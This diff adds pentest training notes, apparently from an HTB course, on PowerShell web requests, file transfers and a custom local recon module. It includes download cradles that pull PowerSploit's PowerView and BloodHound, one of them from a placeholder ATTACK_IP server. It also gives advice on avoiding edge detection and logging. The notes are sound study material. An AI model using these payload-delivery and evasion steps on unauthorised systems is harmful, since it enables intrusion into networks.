@@ -1807,3 +1807,175 @@ PS C:\htb> Test-WSMan -ComputerName "10.129.224.248" -Authentication Negotiate
 # From Windows or a Linux host with PowerShell Core installed
 PS C:\htb> Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate
 ```
+# PowerShell: Interacting with the Web & File Transfers
+
+## Overview
+As a Systems Administrator or Junior Pentester, automating remote updates, software installations, and file transfers via PowerShell is a critical skill. Leveraging native cmdlets and .NET classes eliminates the need for GUI interaction, saving time and enabling stealthy, remote administration or lateral movement during engagements.
+
+## Invoke-WebRequest
+The `Invoke-WebRequest` cmdlet (aliased as `wget`, `curl`, or `iwr`) is the primary utility for interacting with web services in PowerShell. It handles HTTP/HTTPS requests (GET, POST, etc.), parses HTML elements, downloads files, and manages session authentication.
+
+### 1. Basic Web Requests
+Use the `-Method GET` parameter to retrieve website content. Piping the output to `Get-Member` allows you to inspect the object's available properties and methods.
+
+```powershell
+Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member
+```
+
+### 2. Filtering Incoming Content
+Instead of dumping the entire response, you can filter specific properties (such as `Images` or `RawContent`) for targeted reconnaissance and parsing.
+
+```powershell
+# Extracting a clean list of images hosted on the site
+Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images
+
+# Extracting raw HTTP headers and underlying HTML content
+Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent
+```
+
+### 3. Downloading Files (Internet)
+To download remote tools directly to a Windows target, specify the remote resource via `-Uri` and the local destination path via `-OutFile`.
+
+```powershell
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"
+```
+
+### 4. Stealthy Payload Delivery (Local Network)
+To minimize noise and bypass external edge-network detection mechanisms, it is best practice to host payloads on an attack machine and pull them locally across the network.
+
+**Step 1: Start a Python HTTP server on the attack host**
+```bash
+python3 -m http.server 8000
+```
+
+**Step 2: Execute the download cradle on the target Windows machine**
+```powershell
+Invoke-WebRequest -Uri "http://<ATTACK_IP>:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
+```
+
+## Alternative Transfer Method: .NET WebClient
+If `Invoke-WebRequest` is restricted, monitored, or unavailable, the native `System.Net.WebClient` class provides a robust, native fallback for executing file transfers directly through the .NET framework.
+
+```powershell
+# Syntax: (New-Object Net.WebClient).DownloadFile("<URI>", "<Destination>")
+(New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")
+```
+
+> **OpSec Warning:** Both methods execute file writes and generate network requests, which will trigger endpoint and network logging. Local transfers (host-to-host within the same subnet) leave fewer traces at the customer boundary than outbound internet requests, but artifacts will still exist on the local file system.
+
+# PowerShell Scripting & Automation
+
+## Overview
+While PowerShell is inherently powerful, its true value in a SysAdmin or Pentesting environment lies in automation. Transitioning from running ad-hoc commands to developing modular scripts significantly reduces administrative overhead and streamlines repetitive reconnaissance tasks. This module breaks down the core components of PowerShell scripts and modules, culminating in the creation of a custom, automated local reconnaissance tool.
+
+## Scripts vs. Modules
+PowerShell handles execution via two primary paradigms:
+* **Script (`.ps1`)**: An executable text file containing PowerShell cmdlets and functions. Typically executed directly via the `.\script.ps1` syntax.
+* **Module (`.psm1`)**: A bundled collection of scripts, manifests, and functions. Imported into the active session via the `Import-Module` cmdlet, keeping its tools persistently available in memory.
+
+### Key File Extensions
+| Extension | Description |
+| :--- | :--- |
+| `.ps1` | Standard executable PowerShell script. |
+| `.psm1` | PowerShell module file containing the core definitions, functions, and functional code. |
+| `.psd1` | PowerShell data file functioning as a manifest. It details module contents, prerequisites, and metadata via hash tables (key/value pairs). |
+
+---
+
+## Building a Custom Recon Module: `quick-recon`
+**Scenario**: To expedite repetitive host enumeration during engagements, we require a custom module that automatically extracts the Hostname, IP Configuration, Domain Information, and a list of interactive user profiles, outputting the results cleanly to a file.
+
+### 1. Directory Initialization
+For PowerShell to automatically discover the module, it must reside in a directory listed within the `$env:PSModulePath` environment variable.
+```powershell
+# Create the module directory in the standard path
+mkdir $HOME\Documents\WindowsPowerShell\Modules\quick-recon
+```
+
+### 2. Module Manifest (`.psd1`)
+The manifest acts as the module's blueprint, defining metadata (author, version), dependencies, and processing directives.
+```powershell
+# Generate a boilerplate manifest
+New-ModuleManifest -Path $HOME\Documents\WindowsPowerShell\Modules\quick-recon\quick-recon.psd1 -PassThru
+```
+> **Note:** While `ModuleVersion` is the only strictly mandatory field, populating properties like `Author`, `Description`, and the `FunctionsToExport` array is standard practice for professional tooling.
+
+### 3. Module Script & Logic (`.psm1`)
+Initialize the core script file where the actual payload and logic will reside:
+```powershell
+New-Item quick-recon.psm1 -ItemType File
+```
+
+#### The Code Structure
+Below is the complete, refactored code for `quick-recon.psm1`, including dependencies, comment-based help, the core function, and export directives:
+
+```powershell
+# Import required external modules first
+Import-Module ActiveDirectory
+
+<# 
+.SYNOPSIS
+Automated local reconnaissance script.
+
+.DESCRIPTION  
+This function performs initial enumeration tasks on a local host. It extracts the Computer Name, IP configuration, AD Domain details, and local user directories. 
+The output is automatically parsed and saved to 'recon.txt' on the current user's Desktop. 
+Note: Remote Recon functions are in development.
+
+.EXAMPLE  
+Get-Recon
+#>
+function Get-Recon {  
+    # 1. Enumerate system and network information
+    $Hostname = $env:ComputerName  
+    $IP       = ipconfig
+    $Domain   = Get-ADDomain 
+    $Users    = Get-ChildItem C:\Users\
+    
+    # 2. Provision the output file
+    $OutPath  = "~\Desktop\recon.txt"
+    New-Item $OutPath -ItemType File -Force | Out-Null
+    
+    # 3. Format the captured data structure
+    $Vars = "***---Hostname info---***", $Hostname, 
+            "***---Domain Info---***", $Domain, 
+            "***---IP INFO---***", $IP, 
+            "***---USERS---***", $Users
+            
+    # 4. Write data to the destination file
+    Add-Content $OutPath $Vars
+} 
+
+# Restrict global access: Expose ONLY the necessary function and variable
+Export-ModuleMember -Function Get-Recon -Variable Hostname
+```
+
+---
+
+## Understanding Scope in PowerShell
+When developing scripts, understanding **Scope** is critical for operational security and memory management. Scope dictates how PowerShell isolates and protects objects (variables, functions, aliases) from unauthorized access or modification.
+
+| Scope Level | Description |
+| :--- | :--- |
+| **Global** | The default scope. Affects all objects present when the session spawns (e.g., variables defined in your PowerShell Profile). |
+| **Local** | The current operational scope context. |
+| **Script** | A temporary sandbox scope created at runtime for a specific script. Objects within this scope are inaccessible to external processes and are purged upon script termination unless explicitly exported. |
+
+---
+
+## Deployment & Validation
+With the module staged in the correct directory, we can load it into our environment and validate its functionality.
+
+```powershell
+# 1. Import the module into the active session
+Import-Module quick-recon
+
+# 2. Verify successful deployment and exported commands
+Get-Module -Name quick-recon
+
+# 3. Validate comment-based help integration
+Get-Help Get-Recon -Detailed
+
+# 4. Execute the payload
+Get-Recon
+```
